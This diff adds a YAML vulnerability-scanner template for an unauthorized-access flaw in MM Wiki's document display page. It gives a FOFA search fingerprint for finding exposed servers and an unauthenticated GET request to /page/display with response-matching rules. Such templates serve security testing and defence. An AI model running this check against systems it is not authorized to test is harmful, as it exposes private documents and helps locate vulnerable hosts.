@@ -1,0 +1,15 @@
+id: poc-yaml-mm-wiki-display-unauthorized-access
+info:
+  name: MM文档管理器 display 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: mm-wiki
+  fofa: header="mmwikissid"
+requests:
+- method: GET
+  path: /page/display?document_id=1
+  expression: "status_code == 200 && \ncontains(body,\"Powered by MM Wiki\") &&\n\
+    contains(body,\"打开微信\") &&\ncontains(body,\"创建于\")\n"
+variables: {}
+transport: http
